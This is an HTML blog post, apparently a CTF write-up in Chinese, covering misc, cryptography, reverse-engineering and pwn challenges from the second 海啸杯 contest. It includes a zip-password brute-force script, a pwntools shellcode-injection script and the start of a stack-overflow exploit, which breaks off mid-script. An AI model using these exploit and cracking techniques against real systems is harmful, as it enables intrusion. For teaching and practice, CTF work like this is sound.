@@ -1,0 +1,283 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>第二届海啸杯部分题目Writeup | SkYe231 Blog</title><meta name="keywords" content="Writeup,海啸杯"><meta name="author" content="SkYe231"><meta name="copyright" content="SkYe231"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Misc签到题题目提供的1.zip解压出flag.txt，txt文件里面有大量意义不明的字符，尝试性使用base64解密，得到结果如下图：  首行有PNG、Adobe等字样，推测是解密后的明文是PNG文件十六进制文件。用python解密后写入到后缀名为png的文件中，查看图片内容，脚本如下： 1234567#.&#x2F;flag.txtimport base64file &#x3D; open(&amp;#039;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第二届海啸杯部分题目Writeup">
+<meta property="og:url" content="https://skyedai910.github.io/archives/a7cb8952/index.html">
+<meta property="og:site_name" content="SkYe231 Blog">
+<meta property="og:description" content="Misc签到题题目提供的1.zip解压出flag.txt，txt文件里面有大量意义不明的字符，尝试性使用base64解密，得到结果如下图：  首行有PNG、Adobe等字样，推测是解密后的明文是PNG文件十六进制文件。用python解密后写入到后缀名为png的文件中，查看图片内容，脚本如下： 1234567#.&#x2F;flag.txtimport base64file &#x3D; open(&amp;#039;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://skyedai910.github.io/img/default_cover6.png">
+<meta property="article:published_time" content="2019-10-29T06:22:00.000Z">
+<meta property="article:modified_time" content="2021-03-26T08:44:28.001Z">
+<meta property="article:author" content="SkYe231">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="海啸杯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://skyedai910.github.io/img/default_cover6.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://skyedai910.github.io/archives/a7cb8952/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="cEoYWheDVkHH-Yp4JSBTTpaID2pIW7q58RgTg6h1iOs"/><meta name="baidu-site-verification" content="code-Xeczgxl48H"/><meta name="360-site-verification" content="95a7ddcc661de175b37bc99a62cf5c9e"/><meta name="yandex-verification" content="fc0ae24e23c94b47"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8184ae9371af7cedfa47d27c247e16b8";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-154693872-1"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'UA-154693872-1');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"这篇文章距离上次更新已经","messageNext":"天，内容可能已经过时了。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":200,"languages":{"author":"作者: SkYe231","link":"链接: ","source":"来源: SkYe231 Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isanchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-26 16:44:28'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="SkYe231 Blog" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">66</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default_cover6.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">SkYe231 Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">第二届海啸杯部分题目Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-10-29T06:22:00.000Z" title="发表于 2019-10-29 14:22:00">2019-10-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-26T08:44:28.001Z" title="更新于 2021-03-26 16:44:28">2021-03-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>题目提供的<code>1.zip</code>解压出<code>flag.txt</code>，txt文件里面有大量意义不明的字符，尝试性使用<code>base64</code>解密，得到结果如下图：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/20/U7kotCYViuZWn3d.png"></p>
+<p>首行有<code>PNG</code>、<code>Adobe</code>等字样，推测是解密后的明文是PNG文件十六进制文件。用python解密后写入到后缀名为<code>png</code>的文件中，查看图片内容，脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#./flag.txt</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(&amp;<span class="comment">#039;1.png&amp;#039;,&amp;#039;w&amp;#039;)</span></span><br><span class="line">encodestr = base64.b64decode(&amp;<span class="comment">#039;这里填入flag.txt中的密文&amp;#039;.encode(&amp;#039;utf-8&amp;#039;))</span></span><br><span class="line">file.write(encodestr)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/20/YIAsZlXdBTnqgy7.png"></p>
+<h3 id="老烟枪"><a href="#老烟枪" class="headerlink" title="老烟枪"></a>老烟枪</h3><p>用binwalk分析图片，结果显示图片中有一个压缩包。使用命令<code>binwalk -e cxk.png</code>分离出压缩包，得到flag.png，用ps的水平翻转功能，得到正常flag</p>
+<h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/20/FmUsSLTkGZlq5EC.png"></p>
+<h3 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h3><p>这题就是可以百度到的png隐写操作—-修改图片宽高。用winhex打开png文件，对应修改头文件中的高数值，得到flag。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/20/21IzEYGdH8qOarT.png"></p>
+<h4 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h4><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/20/weqvR7HLGPnfjpd.png"></p>
+<h3 id="小明的求助"><a href="#小明的求助" class="headerlink" title="小明的求助"></a>小明的求助</h3><p>题目给出压缩包里面有一个需要密码才能解压的<code>flag.txt</code>文件，且题目提示<em>密码他只知道”hlqiou”加上4位数字</em>。尝试进行爆破。</p>
+<p>生成密码字典：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(&amp;quot;p.txt&amp;quot;,&amp;quot;w&amp;quot;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>,<span class="number">10000</span>):</span><br><span class="line">	file.write(&amp;quot;hlqiou&amp;quot;+<span class="built_in">str</span>(i)+&amp;quot;\n&amp;quot;)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+<p>爆破密码脚本（python2）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#./p.txt</span></span><br><span class="line"><span class="comment">#./xiaoming.zip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zipbp</span>(<span class="params">zfile, pwd</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zfile.extractall(pwd=pwd)</span><br><span class="line">        <span class="built_in">print</span> &amp;<span class="comment">#039;password found : %s&amp;#039; % pwd</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    zfile = zipfile.ZipFile(&amp;<span class="comment">#039;xiaoming.zip&amp;#039;)</span></span><br><span class="line">    pwdall = <span class="built_in">open</span>(&amp;<span class="comment">#039;p.txt&amp;#039;)</span></span><br><span class="line">    <span class="keyword">for</span> pwda <span class="keyword">in</span> pwdall.readlines():</span><br><span class="line">        pwd = pwda.strip(&amp;<span class="comment">#039;\n&amp;#039;)</span></span><br><span class="line">        t = threading.Thread(target=zipbp, args=(zfile, pwd))</span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line"><span class="keyword">if</span> __name__ == &amp;<span class="comment">#039;__main__&amp;#039;:</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><code>password found : hlqiou6974</code></p>
+<h4 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;5oiR54ix6buE6I6J6I2D&#125;</code></p>
+<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="恺撒将军"><a href="#恺撒将军" class="headerlink" title="恺撒将军"></a>恺撒将军</h3><p>这题就是恺撒密码加密，特殊点就是有存在<code>]</code>、<code>&lt;</code>等标点字符，一般在线解密会略过，干脆就自己写脚本，反正就是基于ASCII码做偏移：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strings = &amp;quot;f_tnluz_aghggeao&#123;t_oy_ldoia&#125;&amp;quot;</span><br><span class="line">flag = &amp;quot;&amp;quot;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strings:</span><br><span class="line">	flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">3</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>解密之后得到的是一个base64加密的密文：<code>ZmxhZ3tjcnlwdG9faXNfaHhiX3NvX2VBc3kwfQ==</code>，在解密一次得到flag。</p>
+<h4 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;crypto_is_hxb_so_eAsy0&#125;</code></p>
+<h3 id="小明家的小菜园"><a href="#小明家的小菜园" class="headerlink" title="小明家的小菜园"></a>小明家的小菜园</h3><p>这题是栅栏密码，使用<a target="_blank" rel="noopener" href="https://www.k2zone.cn/?p=1569">CTFcrack</a>提供的栅栏密码工具解密：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/ZiBbRDOLypn7q8U.png"></p>
+<h4 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h4><p>第2栏：<code>flag&#123;yo_uget_itzha_lan_good&#125;</code></p>
+<h3 id="战报"><a href="#战报" class="headerlink" title="战报"></a>战报</h3><p>这题提供较长的明文&amp;密文，尝试分析字频，得到<strong>单表替换</strong>中的对应表。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/GBdmWQTsFuHSj7K.png"></p>
+<p>得到对应表之后，还原得到明文，获得flag</p>
+<h4 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;eantosi&#125;</code></p>
+<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="baby-reverse"><a href="#baby-reverse" class="headerlink" title="baby reverse"></a>baby reverse</h3><p>这道题就是考察IDA的使用，IDA打开后，搜索（atl+t&amp;ctrl+t）flag即可。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/f1PQtdjmhpTGVyo.png"></p>
+<h4 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;reverse_is_easy&#125;</code></p>
+<h3 id="easy-reverse"><a href="#easy-reverse" class="headerlink" title="easy reverse"></a>easy reverse</h3><p>IDA打开，<code>main()</code>里面存在一个条件函数，如果<code>v1=v0</code>则输出<code>you are right!!</code>，否则输出<code>you are wrong!!</code>，推测出需要满足条件才能获得flag，即使<code>v1=v0</code>。<code>v0</code>被赋值为字符串<code>kanlxvdzTljyTfyTeuor</code>；<code>v1</code>是以参数为<code>v3</code>的<code>sub_401005</code>函数的返回值，<code>v3</code>为我们输入值。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/6hCR2TPDlyjB3Ak.png"></p>
+<p><code>sub_401005</code>函数内部运算公式：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/5oRGbv2TMP1KBdQ.png"></p>
+<p>操作就是将每一位输入字符都与<code>0xC</code>异或后加1。那么写个脚本将<code>v0</code>每一位都减1后与<code>0xC</code>异或得到我们应该输入的值。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strings = &amp;quot;kanlxvdzTljyTfyTeuor&amp;quot;</span><br><span class="line">flag = &amp;quot;&amp;quot;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strings:</span><br><span class="line">	flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">1</span>)^<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<h4 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;crypto_is_hxb_so_eAsy0&#125;</code></p>
+<h3 id="霸王别姬"><a href="#霸王别姬" class="headerlink" title="霸王别姬"></a>霸王别姬</h3><p>这题从描述到运行程序是的提示都是很明显地要脱壳。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/m7tpbzIE4y2nRfl.png"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/xCgSndGI4fleWJB.png"></p>
+<p>通用脱壳软件脱壳一下，IDA打开<code>main</code>函数中直接就能找到flag</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/ZaFupY41s9fwzrg.png"></p>
+<p>这个加的是压缩壳<code>UPX</code>，与<code>pwnable.kr</code>中的<code>flag</code>那题有些类似，可以在linux下用命令脱壳。</p>
+<h4 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;upx_so_easy_!&#125;</code></p>
+<h3 id="电竞选手"><a href="#电竞选手" class="headerlink" title="电竞选手"></a>电竞选手</h3><p>IDA打开可以看见最后一个if条件，满足则输出<code>Correct!\nFlag is your input</code>，提示我们输入的让条件符合的值就是flag。条件成立的前提是<code>sub_401350(v4) &amp;&amp; sub_40145A()</code>两个函数的返回值相同。<code>sub_401350</code>的参数<code>v4</code>就是输入值。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/WP4Nxbapiq19yMl.png"></p>
+<p><code>sub_401350</code>函数如下：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/F83p2VS4HXoYqyT.png"></p>
+<p><em>选择case 后数值按<code>r</code>转换为字符</em></p>
+<p>首先判断输入长度是否为32字节，然后取5~30位进入到循环结构，根据输入值的不同向<code>dword_405060</code>数组中写入不同的值，若无匹配则返回0。程序正常循环结束后会返回<code>1</code></p>
+<p><code>sub_40145A</code>函数如下：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/EIQx5RliO7hMkWA.png"></p>
+<p>主体是一个循环体：每次<code>v3</code>加上<code>数组dword_402068</code>的第<code>dword_405060[i]</code>位数；<code>v4</code>加上<code>数组dword_402078</code>的第<code>dword_405060[i]</code>位数。然后3个if条件，如果<code>v2\v3</code>大于9或者小于0；<code>byte_402000[10 * v3 + v2] == 3</code>则返回<code>0</code>。只有<code>byte_402000[10 * v3 + v2] == 43</code>才返回<code>1</code>。</p>
+<p><code>dword_402068</code>、<code>dword_402078</code>两个数组值：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/dbfcxk64YGTSvgu.png"></p>
+<p><code>byte_402000</code>数值值</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/4XIFmPnx9VZToBk.png"></p>
+<p>根据<code>sub_40145A()</code>内部结构，一开始推测是用<code>wasd</code>控制每次循环读取<code>byte_402000</code>的位置，也就是避开<code>#</code>、控制最后读取是<code>+</code>，但是发现长度不对。在师兄提点下发现是用一维数组代表二维数组，从这里看出来的：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/YBaJ5erWkcRVIOn.png"></p>
+<p><code>10*v3</code>代表的是行号，还有给出提示一行有10个元素（v3+1就读取跳了10位，相当于读取下一行同一列的元素）。<code>v2</code>代表列号。以此将<code>byte_402000</code>数值的值转换为二维数组，如图所示：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/4pPK5ovG6dDxAzE.png"></p>
+<p>出发点就是<code>v2\v3</code>的初始值，用<code>wasd</code>控制移动，最后移动到<code>+</code>。</p>
+<h4 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;wwwwaaasssaassssdddssddddw&#125;</code></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>32位只开PIE保护</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/l1WrJXvzLHQfwFx.png"></p>
+<p>直接运行：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/IEbAnXaVgzfYJ8Q.png"></p>
+<p>IDA打开发现直接程序将输入的，当成命令执行了。那么直接输入shellcode就行了。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/T8SkDXMtlVKq4xC.png"></p>
+<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">p = process(&amp;quot;./shellcode&amp;quot;)</span><br><span class="line"><span class="comment">#p = remote(&amp;quot;139.199.10.70&amp;quot;,10003)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="simple-stackoverflow"><a href="#simple-stackoverflow" class="headerlink" title="simple_stackoverflow"></a>simple_stackoverflow</h3><p>32位保护全关</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/mkil1sFO69yCLdg.png"></p>
+<p>直接运行：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/yVNpjnbGex3rXSA.png"></p>
+<p>IDA分析，在<code>main()</code>里面的<code>overflow()</code>里面，变量<code>buf</code>距离栈底为<code>0x20</code>，而<code>read</code>可以从终端输入取最多<code>0x3FF</code>字节写入到<code>buf</code>中，这里就存在<strong>栈溢出</strong>。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/notYXBFqyhTAZ63.png"></p>
+<p>这里利用栈溢出控制指针，再次调用read函数向某地址写入shellcode之后，然后控制指针运行到shellcode。写入地址选择固定地址如bss段、data段（地址在IDA ctrl+s 查找），我就选择写入</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/JtCkh64BWxSv27D.png"></p>
+<p>然后问题就是怎么给溢出后调用的read传参。read函数有三个参数，32位传参看图：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/x93fAE4KZreycT2.png"></p>
+<h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p = 